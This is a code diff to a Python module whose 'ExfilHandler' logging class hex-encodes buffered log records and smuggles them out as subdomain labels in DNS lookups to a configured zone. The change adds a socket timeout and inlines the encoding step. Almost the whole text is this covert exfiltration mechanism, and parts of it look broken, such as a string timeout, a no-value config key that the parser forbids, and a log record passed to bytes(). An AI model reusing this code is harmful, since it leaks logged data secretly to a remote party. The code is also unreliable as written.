@@ -16,6 +16,7 @@ except ImportError:
 
 config = """
 [rokkaku]
+timeout = 1
 dns_zone
 """
 
@@ -23,22 +24,19 @@ sb = StringIO(config)
 config = configparser.ConfigParser(allow_no_value=False)
 config.readfp(sb)
 
+socket.setdefaulttimeout(config['rokkaku']['timeout'])
+
 
 class ExfilHandler(logging.handlers.MemoryHandler):
 
     def __init__(self, **kwargs):
         super(ExfilHandler, self).__init__(**kwargs)
 
-    @staticmethod
-    def convert(self, records):
-        data = bytes(records, 'utf8')
-        return binascii.hexlify(data)
-
     def emit(self, record):
         self.buffer.append(record)
         if self.shouldFlush(record):
             self.flush()
-            payload = self.convert(records)
+            payload = binascii.hexlify(bytes(record, 'utf8'))
             socket.gethostbyname(
                 '{0}.{1}'.format(
                     payload,
